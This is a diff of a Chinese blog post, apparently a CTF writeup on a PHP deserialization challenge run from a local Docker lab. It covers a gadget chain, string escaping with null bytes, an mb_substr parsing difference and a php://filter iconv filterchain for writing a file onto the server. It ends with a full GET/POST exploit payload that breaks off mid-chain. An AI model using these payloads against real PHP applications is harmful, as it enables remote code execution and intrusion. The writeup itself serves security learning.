@@ -20,20 +20,33 @@
     var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"manual","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
   </script>
 
-  <meta name="description" content="# wp  # 8.29第一次  文件打开cmd  输入命令行，一开始忘记开梯子了，拉不下下来报错了还  1docker compose up -d  访问http:&#x2F;&#x2F;localhost:9292&#x2F;，就能看到题目了  粗略一看过去是反序列化题  漏洞利用链  C-&gt;__destruct-&gt;B-&gt;__toString-&gt;A-&gt;readflag()  &#96;$ser &#x3D; serialize(new C">
+  <meta name="description" content="8.29第一次 文件打开cmd 输入命令行，一开始忘记开梯子了，拉不下下来报错了还 访问http:&#x2F;&#x2F;localhost:9292&#x2F;，就能看到题目了 粗略一看过去是反序列化题 漏洞利用链 C-&gt;__destruct-&gt;B-&gt;__toString-&gt;A-&gt;readflag() 这个应该是字符串逃逸进去…">
 <meta property="og:type" content="article">
 <meta property="og:title" content="wp">
 <meta property="og:url" content="http://example.com/2026/09/16/19-wp/index.html">
 <meta property="og:site_name" content="Glut4micum">
-<meta property="og:description" content="# wp  # 8.29第一次  文件打开cmd  输入命令行，一开始忘记开梯子了，拉不下下来报错了还  1docker compose up -d  访问http:&#x2F;&#x2F;localhost:9292&#x2F;，就能看到题目了  粗略一看过去是反序列化题  漏洞利用链  C-&gt;__destruct-&gt;B-&gt;__toString-&gt;A-&gt;readflag()  &#96;$ser &#x3D; serialize(new C">
+<meta property="og:description" content="8.29第一次 文件打开cmd 输入命令行，一开始忘记开梯子了，拉不下下来报错了还 访问http:&#x2F;&#x2F;localhost:9292&#x2F;，就能看到题目了 粗略一看过去是反序列化题 漏洞利用链 C-&gt;__destruct-&gt;B-&gt;__toString-&gt;A-&gt;readflag() 这个应该是字符串逃逸进去…">
 <meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/yuque-notes/02-Knowledge%20Book/assets/833d6119-image.png">
+<meta property="og:image" content="http://example.com/yuque-notes/02-Knowledge%20Book/assets/cd8767ee-image.png">
+<meta property="og:image" content="http://example.com/yuque-notes/02-Knowledge%20Book/assets/00040773-image.png">
+<meta property="og:image" content="http://example.com/yuque-notes/02-Knowledge%20Book/assets/bff5ddbf-image.png">
+<meta property="og:image" content="http://example.com/yuque-notes/02-Knowledge%20Book/assets/0b5a8db0-image.png">
+<meta property="og:image" content="http://example.com/yuque-notes/02-Knowledge%20Book/assets/620b3129-image.png">
+<meta property="og:image" content="http://example.com/yuque-notes/02-Knowledge%20Book/assets/9bb03b2f-image.png">
+<meta property="og:image" content="http://example.com/yuque-notes/02-Knowledge%20Book/assets/293c1dc8-image.png">
+<meta property="og:image" content="http://example.com/yuque-notes/02-Knowledge%20Book/assets/f7d57b42-image.png">
+<meta property="og:image" content="http://example.com/yuque-notes/02-Knowledge%20Book/assets/3d85279c-image.png">
 <meta property="article:published_time" content="2026-09-16T13:58:49.000Z">
 <meta property="article:modified_time" content="2026-09-16T13:58:49.000Z">
 <meta property="article:author" content="谷氨酸棒状杆菌">
-<meta property="article:tag" content="Web安全">
 <meta property="article:tag" content="CTF">
-<meta property="article:tag" content="学习笔记">
+<meta property="article:tag" content="Writeup">
+<meta property="article:tag" content="HNUCTF">
+<meta property="article:tag" content="PHP">
+<meta property="article:tag" content="反序列化">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/yuque-notes/02-Knowledge%20Book/assets/833d6119-image.png">
 
 <link rel="canonical" href="http://example.com/2026/09/16/19-wp/">
 
@@ -235,6 +248,7 @@
               <span class="post-meta-item-text">阅读次数：</span>
               <span id="busuanzi_value_page_pv"></span>
             </span>
+            <div class="post-description">8.29第一次 文件打开cmd 输入命令行，一开始忘记开梯子了，拉不下下来报错了还 访问http://localhost:9292/，就能看到题目了 粗略一看过去是反序列化题 漏洞利用链 C->__destruct->B->__toString->A->readflag() 这个应该是字符串逃逸进去…</div>
 
         </div>
       </header>
@@ -245,158 +259,91 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        
-# wp
-
-# 8.29第一次
-
-文件打开cmd
-
-输入命令行，一开始忘记开梯子了，拉不下下来报错了还
-
+        <h1 id="wp"><a href="#wp" class="headerlink" title="wp"></a>wp</h1><h1 id="8-29第一次"><a href="#8-29第一次" class="headerlink" title="8.29第一次"></a>8.29第一次</h1><p>文件打开cmd</p>
+<p>输入命令行，一开始忘记开梯子了，拉不下下来报错了还</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker compose up -d</span><br></pre></td></tr></table></figure>
 
-访问http://localhost:9292/，就能看到题目了
-
-粗略一看过去是反序列化题
-
-漏洞利用链
-
-C->__destruct->B->__toString->A->readflag()
-
-`$ser = serialize(new C($_GET['c']));`
-
-这个应该是字符串逃逸进去，\0会被替换成00，为字符串增多逃逸,给str赋值
-
-C->str=B
-
+<p>访问<a target="_blank" rel="noopener" href="http://localhost:9292/%EF%BC%8C%E5%B0%B1%E8%83%BD%E7%9C%8B%E5%88%B0%E9%A2%98%E7%9B%AE%E4%BA%86">http://localhost:9292/，就能看到题目了</a></p>
+<p>粗略一看过去是反序列化题</p>
+<p>漏洞利用链</p>
+<p>C-&gt;__destruct-&gt;B-&gt;__toString-&gt;A-&gt;readflag()</p>
+<p><code>$ser = serialize(new C($_GET[&#39;c&#39;]));</code></p>
+<p>这个应该是字符串逃逸进去，\0会被替换成00，为字符串增多逃逸,给str赋值</p>
+<p>C-&gt;str&#x3D;B</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hnu1=]]]]]]]]]]]]]][HnuCTF]</span><br><span class="line"><span class="variable language_">$this</span>-&gt;b = [<span class="keyword">new</span> <span class="title function_ invoke__">A</span>(), <span class="string">&quot;readflag&quot;</span>];</span><br></pre></td></tr></table></figure>
 
-> 在phpstrom试了半天，我说怎么输出不出来flag，flag文件留着，里面内容被我删了，西巴。
-
-感觉readflag那里要用一句话木马
-
-序列化用的是双引号，PHP 使用单引号时 `\0`无法被转义，并且在序列化中 s 不能识别十六进制字符，因此需要将 `s` 改为 `S`,十六进制的\00即可实现绕过
-
-需要逃逸进去的内容
-
+<blockquote>
+<p>在phpstrom试了半天，我说怎么输出不出来flag，flag文件留着，里面内容被我删了，西巴。</p>
+</blockquote>
+<p>感觉readflag那里要用一句话木马</p>
+<p>序列化用的是双引号，PHP 使用单引号时 <code>\0</code>无法被转义，并且在序列化中 s 不能识别十六进制字符，因此需要将 <code>s</code> 改为 <code>S</code>,十六进制的\00即可实现绕过</p>
+<p>需要逃逸进去的内容</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// Hnu-Reproducing-Plan-1</span></span><br><span class="line"><span class="comment">// 取材于最近某比赛，代码略微修改，题目切勿外传。</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>( <span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$key</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;key = <span class="string">&quot;\0key\0&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">readflag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;key=== <span class="string">&quot;\0key\0&quot;</span>)&#123;;</span><br><span class="line"><span class="comment">//            $a = &#x27;/flag.php&#x27;;</span></span><br><span class="line"><span class="comment">//            $contents = file_get_contents($a);</span></span><br><span class="line"><span class="comment">//            echo $contents;</span></span><br><span class="line"><span class="comment">//            file_put_contents($a, $contents);这里还没写出来</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;b = [<span class="keyword">new</span> <span class="title function_ invoke__">A</span>(), <span class="string">&quot;readflag&quot;</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line"></span><br><span class="line">            <span class="comment">//var_dump($this-&gt;b);</span></span><br><span class="line">            <span class="keyword">return</span> (<span class="variable language_">$this</span>-&gt;b) ();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$s</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;s = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;str = <span class="keyword">new</span> <span class="title function_ invoke__">B</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span> -&gt;str;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//$c=&#x27;&quot;;s:3:&quot;str&quot;;O:1:&quot;B&quot;:1:&#123;s:1:&quot;b&quot;;a:2:&#123;i:0;O:1:&quot;A&quot;:1:&#123;s:3:&quot;key&quot;;s:5:&quot;key&quot;;&#125;i:1;s:8:&quot;readflag&quot;;&#125;&#125;&#125;&#x27;;</span></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">C</span>();</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="comment">//$data = str_ireplace(&quot;\0&quot;,&quot;00&quot;,$b);</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;;s:3:&quot;</span>str<span class="string">&quot;;O:1:&quot;</span>B<span class="string">&quot;:1:&#123;s:1:&quot;</span>b<span class="string">&quot;;a:2:&#123;i:0;O:1:&quot;</span>A<span class="string">&quot;:1:&#123;s:3:&quot;</span>key<span class="string">&quot;;s:5:&quot;</span>\<span class="number">0</span>key\<span class="number">0</span><span class="string">&quot;;&#125;i:1;s:8:&quot;</span>readflag<span class="string">&quot;;&#125;&#125;&#125;</span></span><br></pre></td></tr></table></figure>
 
-![image.png](/yuque-notes/02-Knowledge Book/assets/833d6119-image.png)
-
-​
-
-> 我是菜狗，没写出来
-
-> 咨询了GBK，最后是利用这个filterchain，伪协议落地一个代码，找了个工具，但是不知道为什么没出。
-
-后续听了徐神的讲课，也是找到原因了,我们的目的是往里面写文件，把php命令落地，工具是作者根据自己当时的题目写出来的，没有灵活使用。
-
-## 知识总结
-
-### 逃逸部分
-
-php特性，可以通过数组的方式动态调用其他类内的方法，$this->b = [new A(), "readflag"];这里就是利用这个漏洞原理。
-
-### mb_substr和mb_strpos解析差异引起的漏洞
-
-`substrstr($_GET['hnu1']."[welcome to". $_GET['hnu']."CTF]");`
-
-方法一：
-
-通过代码解析上面的substrstr函数，利用数学的方法实现`hnu1=]]]]]]]]]]]]]][HnuCTF]`
-
-方法二：
-
-mb_substr是按字来切分字符，而mb_strcut是按字节来切分字符，利用这一点，我们也可以进行构造
-
+<p><img src="/yuque-notes/02-Knowledge%20Book/assets/833d6119-image.png" alt="image.png"></p>
+<p>​</p>
+<blockquote>
+<p>我是菜狗，没写出来</p>
+</blockquote>
+<blockquote>
+<p>咨询了GBK，最后是利用这个filterchain，伪协议落地一个代码，找了个工具，但是不知道为什么没出。</p>
+</blockquote>
+<p>后续听了徐神的讲课，也是找到原因了,我们的目的是往里面写文件，把php命令落地，工具是作者根据自己当时的题目写出来的，没有灵活使用。</p>
+<h2 id="知识总结"><a href="#知识总结" class="headerlink" title="知识总结"></a>知识总结</h2><h3 id="逃逸部分"><a href="#逃逸部分" class="headerlink" title="逃逸部分"></a>逃逸部分</h3><p>php特性，可以通过数组的方式动态调用其他类内的方法，$this-&gt;b &#x3D; [new A(), “readflag”];这里就是利用这个漏洞原理。</p>
+<h3 id="mb-substr和mb-strpos解析差异引起的漏洞"><a href="#mb-substr和mb-strpos解析差异引起的漏洞" class="headerlink" title="mb_substr和mb_strpos解析差异引起的漏洞"></a>mb_substr和mb_strpos解析差异引起的漏洞</h3><p><code>substrstr($_GET[&#39;hnu1&#39;].&quot;[welcome to&quot;. $_GET[&#39;hnu&#39;].&quot;CTF]&quot;);</code></p>
+<p>方法一：</p>
+<p>通过代码解析上面的substrstr函数，利用数学的方法实现<code>hnu1=]]]]]]]]]]]]]][HnuCTF]</code></p>
+<p>方法二：</p>
+<p>mb_substr是按字来切分字符，而mb_strcut是按字节来切分字符，利用这一点，我们也可以进行构造</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$hnu1</span> = <span class="string">&quot;\xf0\x9f\x9fa\xf0\x9f\x9fa\xf0\x9f\x9fa\xf0\x9f\x9fa\xf0\x9f\x9fa\xf0\x9f\x9fa\xf0\x9f\x9fa\xf0\x9f\x9fa\xf0\x9f\x9fa\xf0\x9f\x9fa&quot;</span>;</span><br><span class="line"><span class="variable">$hnu</span> = <span class="string">&quot;Hnu&quot;</span>;</span><br></pre></td></tr></table></figure>
 
-### filterchain
+<h3 id="filterchain"><a href="#filterchain" class="headerlink" title="filterchain"></a>filterchain</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span> = <span class="variable">$_POST</span>[<span class="number">1</span>];</span><br><span class="line">      <span class="variable">$contents</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$a</span>);</span><br><span class="line">      <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$a</span>, <span class="variable">$contents</span>);</span><br></pre></td></tr></table></figure>
 
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span> = <span class="variable">$_POST</span>[<span class="number">1</span>];</span><br><span class="line">      <span class="variable">$contents</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$a</span>);</span><br><span class="line">      <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$a</span>, <span class="variable">$contents</span>);</span><br></pre></td></tr></table></figure>
-
-这个代码的解读，首先把a里面的内容给读出来，赋给contents，又把contents写入a里面，实际上我们什么也没有做，需要利用的是filterchain，通过一些列的构造我们的目标命令。
-
-参考文章：[FilterChain攻击解析及利用 - Boogiepop Doesn’t Laugh](https://boogipop.com/2023/03/02/FilterChain%E6%94%BB%E5%87%BB%E8%A7%A3%E6%9E%90%E5%8F%8A%E5%88%A9%E7%94%A8/#Filterchain%E6%9E%84%E9%80%A0%EF%BC%88%E5%8E%9F%E7%90%86%E9%98%90%E8%BF%B0%EF%BC%89)
-
-直接利用工具生成
-
-​
-
-### filer伪协议的write和read
-
-![image.png](/yuque-notes/02-Knowledge Book/assets/cd8767ee-image.png)
-
+<p>这个代码的解读，首先把a里面的内容给读出来，赋给contents，又把contents写入a里面，实际上我们什么也没有做，需要利用的是filterchain，通过一些列的构造我们的目标命令。</p>
+<p>参考文章：<a target="_blank" rel="noopener" href="https://boogipop.com/2023/03/02/FilterChain%E6%94%BB%E5%87%BB%E8%A7%A3%E6%9E%90%E5%8F%8A%E5%88%A9%E7%94%A8/#Filterchain%E6%9E%84%E9%80%A0%EF%BC%88%E5%8E%9F%E7%90%86%E9%98%90%E8%BF%B0%EF%BC%89">FilterChain攻击解析及利用 - Boogiepop Doesn’t Laugh</a></p>
+<p>直接利用工具生成</p>
+<p>​</p>
+<h3 id="filer伪协议的write和read"><a href="#filer伪协议的write和read" class="headerlink" title="filer伪协议的write和read"></a>filer伪协议的write和read</h3><p><img src="/yuque-notes/02-Knowledge%20Book/assets/cd8767ee-image.png" alt="image.png"></p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$contents</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;php://filter/read=convert.base64-encode/resource=a.php&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$contents</span>;</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="string">&quot;php://filter/write=convert.base64-encode/resource=a.php&quot;</span>,<span class="variable">$contents</span>);</span><br></pre></td></tr></table></figure>
 
-![image.png](/yuque-notes/02-Knowledge Book/assets/00040773-image.png)
-
-在file_put_contents使用write会被二次编码写入
-
-当两个用的都是read
-
-![image.png](/yuque-notes/02-Knowledge Book/assets/bff5ddbf-image.png)
-
-可以看到并没有被二次编码，成功保留格式写入进去了
-
-![image.png](/yuque-notes/02-Knowledge Book/assets/0b5a8db0-image.png)
-
-都用write的话，我们可以看到，是可以原样读出的。
-
-​
-
-![image.png](/yuque-notes/02-Knowledge Book/assets/620b3129-image.png)
-
-![image.png](/yuque-notes/02-Knowledge Book/assets/9bb03b2f-image.png)
-
-![image.png](/yuque-notes/02-Knowledge Book/assets/293c1dc8-image.png)
-
-![image.png](/yuque-notes/02-Knowledge Book/assets/f7d57b42-image.png)
-
-最终payload
-
+<p><img src="/yuque-notes/02-Knowledge%20Book/assets/00040773-image.png" alt="image.png"></p>
+<p>在file_put_contents使用write会被二次编码写入</p>
+<p>当两个用的都是read</p>
+<p><img src="/yuque-notes/02-Knowledge%20Book/assets/bff5ddbf-image.png" alt="image.png"></p>
+<p>可以看到并没有被二次编码，成功保留格式写入进去了</p>
+<p><img src="/yuque-notes/02-Knowledge%20Book/assets/0b5a8db0-image.png" alt="image.png"></p>
+<p>都用write的话，我们可以看到，是可以原样读出的。</p>
+<p>​</p>
+<p><img src="/yuque-notes/02-Knowledge%20Book/assets/620b3129-image.png" alt="image.png"></p>
+<p><img src="/yuque-notes/02-Knowledge%20Book/assets/9bb03b2f-image.png" alt="image.png"></p>
+<p><img src="/yuque-notes/02-Knowledge%20Book/assets/293c1dc8-image.png" alt="image.png"></p>
+<p><img src="/yuque-notes/02-Knowledge%20Book/assets/f7d57b42-image.png" alt="image.png"></p>
+<p>最终payload</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET:?c=%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A3%<span class="number">3</span>A%<span class="number">22</span>str%<span class="number">22</span>%<span class="number">3</span>BO%<span class="number">3</span>A1%<span class="number">3</span>A%<span class="number">22</span>B%<span class="number">22</span>%<span class="number">3</span>A1%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A1%<span class="number">3</span>A%<span class="number">22</span>b%<span class="number">22</span>%<span class="number">3</span>Ba%<span class="number">3</span>A2%<span class="number">3</span>A%<span class="number">7</span>Bi%<span class="number">3</span>A0%<span class="number">3</span>BO%<span class="number">3</span>A1%<span class="number">3</span>A%<span class="number">22</span>A%<span class="number">22</span>%<span class="number">3</span>A1%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A3%<span class="number">3</span>A%<span class="number">22</span>key%<span class="number">22</span>%<span class="number">3</span>BS%<span class="number">3</span>A5%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">5</span>C%<span class="number">00</span>key%<span class="number">5</span>C%<span class="number">00</span>%<span class="number">22</span>%<span class="number">3</span>B%<span class="number">7</span>Di%<span class="number">3</span>A1%<span class="number">3</span>Bs%<span class="number">3</span>A8%<span class="number">3</span>A%<span class="number">22</span>readflag%<span class="number">22</span>%<span class="number">3</span>B%<span class="number">7</span>D%<span class="number">7</span>D%<span class="number">7</span>D&amp;hnu1=]]]]]]]]]]]]]][HnuCTF]</span><br><span class="line">POST:<span class="number">1</span>=php:<span class="comment">//filter/read=convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16|convert.iconv.WINDOWS-1258.UTF32LE|convert.iconv.ISIRI3342.ISO-IR-157|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSA_T500.UTF-32|convert.iconv.CP857.ISO-2022-JP-3|convert.iconv.ISO2022JP2.CP775|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM891.CSUNICODE|convert.iconv.ISO8859-14.ISO6937|convert.iconv.BIG-FIVE.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.BIG5HKSCS.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.CP1163.CSA_T500|convert.iconv.UCS-2.MSCP949|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.BIG5HKSCS.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-4LE.OSF05010001|convert.iconv.IBM912.UTF-16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UT